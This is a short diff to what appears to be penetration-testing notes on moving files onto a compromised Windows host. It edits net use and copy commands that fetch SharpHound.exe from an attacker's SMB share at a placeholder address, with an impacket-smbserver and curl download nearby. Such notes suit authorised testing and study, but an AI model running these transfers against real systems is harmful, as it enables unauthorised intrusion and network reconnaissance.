@@ -22,9 +22,9 @@ impacket-smbserver smb .
 On Windows:
 
 ```
-net use \\kali-ip\smb
+net use \\<kali-ip>\smb
 
-copy \\kali-ip\smb\SharpHound.exe .
+copy \\<kali-ip>\smb\SharpHound.exe .
 
 dir
 
@@ -99,20 +99,3 @@ curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
 ## References
 
 {% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
